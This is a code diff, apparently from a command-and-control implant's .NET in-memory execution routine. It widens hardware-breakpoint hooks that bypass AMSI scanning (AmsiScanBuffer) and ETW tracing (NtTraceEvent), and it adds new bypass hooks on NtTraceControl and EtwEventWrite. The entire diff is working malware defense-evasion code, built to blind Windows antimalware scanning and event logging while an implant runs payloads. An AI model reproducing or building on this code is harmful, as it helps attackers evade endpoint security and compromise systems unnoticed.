@@ -2,6 +2,7 @@
 
 #include <core/MiniStd.h>
 #include <core/Dotnet.h>
+#include <core/HwBpEngine.h>
 #include <core/HwBpExceptions.h>
 #include <core/Runtime.h>
 
@@ -110,7 +111,7 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
         if ( AmsiIsLoaded )
         {
             PUTS( "HwBp Engine add AmsiScanBuffer bypass" )
-            if ( ! NT_SUCCESS( Status = HwBpEngineAdd( NULL, ThreadId, Instance->Win32.AmsiScanBuffer, HwBpExAmsiScanBuffer, 0 ) ) ) {
+            if ( ! NT_SUCCESS( Status = HwBpEngineAdd( NULL, ThreadId, Instance->Win32.AmsiScanBuffer, HwBpExAmsiScanBuffer, 0xFF ) ) ) {
                 PRINTF( "Failed adding exception to HwBp Engine: %08x\n", Status )
                 return FALSE;
             }
@@ -118,9 +119,25 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
 
         /* add Etw bypass */
         PUTS( "HwBp Engine add NtTraceEvent bypass" )
-        if ( ! NT_SUCCESS( HwBpEngineAdd( NULL, ThreadId, Instance->Win32.NtTraceEvent, HwBpExNtTraceEvent, 1 ) ) ) {
+        if ( ! NT_SUCCESS( HwBpEngineAdd( NULL, ThreadId, Instance->Win32.NtTraceEvent, HwBpExNtTraceEvent, 0xFF ) ) ) {
             PRINTF( "Failed adding exception to HwBp Engine: %08x\n", Status )
             return FALSE;
+        }
+
+        /* add NtTraceControl bypass */
+        if ( Instance->Win32.NtTraceControl ) {
+            PUTS( "HwBp Engine add NtTraceControl bypass" )
+            if ( ! NT_SUCCESS( HwBpEngineAdd( NULL, ThreadId, Instance->Win32.NtTraceControl, HwBpExNtTraceControl, 0xFF ) ) ) {
+                PRINTF( "Failed adding NtTraceControl to HwBp Engine: %08x\n", Status )
+            }
+        }
+
+        /* add EtwEventWrite bypass */
+        if ( Instance->Win32.EtwEventWrite ) {
+            PUTS( "HwBp Engine add EtwEventWrite bypass" )
+            if ( ! NT_SUCCESS( HwBpEngineAdd( NULL, ThreadId, Instance->Win32.EtwEventWrite, HwBpExEtwEventWrite, 0xFF ) ) ) {
+                PRINTF( "Failed adding EtwEventWrite to HwBp Engine: %08x\n", Status )
+            }
         }
 
         PackageTransmit( PackageInfo );
